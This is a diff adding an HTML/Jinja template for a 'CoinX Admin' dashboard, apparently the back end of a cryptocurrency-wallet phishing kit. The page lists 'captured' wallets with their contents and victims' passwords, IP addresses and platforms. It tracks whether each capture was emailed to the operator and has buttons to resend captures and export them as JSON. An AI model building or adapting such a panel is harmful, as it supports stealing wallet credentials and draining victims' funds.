@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - CoinX Database</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0f172a;
+            color: #f8fafc;
+        }
+        .glass-card {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .log-entry {
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        .status-sent { color: #22c55e; }
+        .status-failed { color: #ef4444; }
+        .status-pending { color: #f59e0b; }
+    </style>
+</head>
+<body class="min-h-screen">
+    <!-- Header -->
+    <header class="bg-slate-900 border-b border-slate-800 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-red-600 rounded-lg flex items-center justify-center">
+                    <i class="fa-solid fa-database text-white"></i>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold text-white">CoinX Admin</h1>
+                    <p class="text-xs text-gray-400">Logged in as {{ username }}</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-4">
+                <span class="text-sm text-gray-400">
+                    <i class="fa-solid fa-envelope mr-1"></i> {{ admin_email }}
+                </span>
+                <a href="{{ url_for('admin_logout') }}" 
+                   class="bg-slate-800 hover:bg-slate-700 text-white px-4 py-2 rounded-lg text-sm transition-colors">
+                    <i class="fa-solid fa-sign-out-alt mr-1"></i> Logout
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 py-6">
+        <!-- Stats -->
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
+            <div class="glass-card rounded-xl p-4">
+                <div class="text-gray-400 text-sm">Total Captured</div>
+                <div class="text-3xl font-bold text-white">{{ total_wallets }}</div>
+            </div>
+            <div class="glass-card rounded-xl p-4">
+                <div class="text-gray-400 text-sm">Emails Sent</div>
+                <div class="text-3xl font-bold text-green-400">{{ emails_sent }}</div>
+            </div>
+            <div class="glass-card rounded-xl p-4">
+                <div class="text-gray-400 text-sm">Failed Emails</div>
+                <div class="text-3xl font-bold text-red-400">{{ emails_failed }}</div>
+            </div>
+            <div class="glass-card rounded-xl p-4">
+                <div class="text-gray-400 text-sm">Success Rate</div>
+                <div class="text-3xl font-bold text-blue-400">
+                    {% if total_wallets > 0 %}
+                        {{ "%.1f"|format((emails_sent / total_wallets) * 100) }}%
+                    {% else %}
+                        0%
+                    {% endif %}
+                </div>
+            </div>
+        </div>
+
+        <!-- Actions -->
+        <div class="flex flex-wrap gap-3 mb-6">
+            <button onclick="clearAll()" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors">
+                <i class="fa-solid fa-trash mr-1"></i> Clear All
+            </button>
+            <a href="{{ url_for('export_data') }}" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors">
+                <i class="fa-solid fa-download mr-1"></i> Export JSON
+            </a>
+            <button onclick="location.reload()" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors">
+                <i class="fa-solid fa-refresh mr-1"></i> Refresh
+            </button>
+        </div>
+
+        <!-- Tabs -->
+        <div class="flex gap-4 border-b border-slate-700 mb-6">
+            <button onclick="showTab('captures')" id="tab-captures" class="pb-3 border-b-2 border-red-500 text-white font-medium">
+                Captures ({{ wallets|length }})
+            </button>
+            <button onclick="showTab('logs')" id="tab-logs" class="pb-3 border-b-2 border-transparent text-gray-400 hover:text-white font-medium">
+                Login History
+            </button>
+        </div>
+
+        <!-- Captures Tab -->
+        <div id="content-captures" class="space-y-3">
+            {% for wallet in wallets %}
+            <div class="log-entry">
+                <div class="flex justify-between items-start mb-2">
+                    <div>
+                        <span class="text-blue-400 font-bold">#{{ wallet.id }}</span>
+                        <span class="text-white font-bold ml-2">{{ wallet.wallet_type }}</span>
+                        <span class="text-gray-400">({{ wallet.input_type }})</span>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-gray-500 text-xs">{{ wallet.timestamp }}</div>
+                        {% if wallet.email_sent %}
+                            <span class="status-sent text-xs"><i class="fa-solid fa-check"></i> Emailed</span>
+                        {% else %}
+                            <span class="status-failed text-xs"><i class="fa-solid fa-times"></i> {{ wallet.email_status }}</span>
+                        {% endif %}
+                    </div>
+                </div>
+                
+                <div class="bg-slate-950 rounded p-3 my-2">
+                    <div class="text-green-400 break-all">{{ wallet.content }}</div>
+                    {% if wallet.password %}
+                    <div class="text-yellow-400 mt-1">Password: {{ wallet.password }}</div>
+                    {% endif %}
+                </div>
+                
+                <div class="flex justify-between items-center text-xs text-gray-500">
+                    <span>
+                        <i class="fa-solid fa-globe mr-1"></i> {{ wallet.ip_address }}
+                        <i class="fa-solid fa-desktop ml-2 mr-1"></i> {{ wallet.platform }}
+                    </span>
+                    {% if not wallet.email_sent %}
+                    <button onclick="resendEmail({{ wallet.id }})" class="text-blue-400 hover:text-blue-300">
+                        <i class="fa-solid fa-paper-plane mr-1"></i> Resend Email
+                    </button>
+                    {% endif %}
+                </div>
+            </div>
+            {% else %}
+            <p class="text-gray-500 text-center py-8">No captures yet...</p>
+            {% endfor %}
+        </div>
+
+        <!-- Login Logs Tab (Hidden by default) -->
+        <div id="content-logs" class="space-y-3 hidden">
+            {% for log in admin_logs %}
+            <div class="log-entry">
+                <div class="flex justify-between items-center">
+                    <div>
+                        <span class="{% if log.success %}text-green-400{% else %}text-red-400{% endif %} font-bold">
+                            {% if log.success %}✓ SUCCESS{% else %}✗ FAILED{% endif %}
+                        </span>
+                        <span class="text-white ml-2">{{ log.username }}</span>
+                    </div>
+                    <span class="text-gray-500 text-xs">{{ log.timestamp }}</span>
+                </div>
+                <div class="text-gray-500 text-xs mt-1">
+                    IP: {{ log.ip_address }} | {{ log.user_agent[:50] }}...
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+    </main>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script>
+        function showTab(tab) {
+            // Hide all
+            document.getElementById('content-captures').classList.add('hidden');
+            document.getElementById('content-logs').classList.add('hidden');
+            document.getElementById('tab-captures').classList.remove('border-red-500', 'text-white');
+            document.getElementById('tab-captures').classList.add('border-transparent', 'text-gray-400');
+            document.getElementById('tab-logs').classList.remove('border-red-500', 'text-white');
+            document.getElementById('tab-logs').classList.add('border-transparent', 'text-gray-400');
+            
+            // Show selected
+            document.getElementById('content-' + tab).classList.remove('hidden');
+            document.getElementById('tab-' + tab).classList.remove('border-transparent', 'text-gray-400');
+            document.getElementById('tab-' + tab).classList.add('border-red-500', 'text-white');
+        }
+
+        function clearAll() {
+            if (!confirm('⚠️ Delete ALL captured wallet data? This cannot be undone!')) return;
+            
+            fetch('/admin/api/clear', {method: 'POST'})
+                .then(r => r.json())
+                .then(data => {
+                    if (data.success) location.reload();
+                    else alert('Error: ' + data.error);
+                });
+        }
+
+        function resendEmail(id) {
+            fetch('/admin/api/resend/' + id, {method: 'POST'})
+                .then(r => r.json())
+                .then(data => {
+                    if (data.success) {
+                        alert('✅ Email resent successfully!');
+                        location.reload();
+                    } else {
+                        alert('❌ Failed: ' + data.status);
+                    }
+                });
+        }
+    </script>
+</body>
+</html>
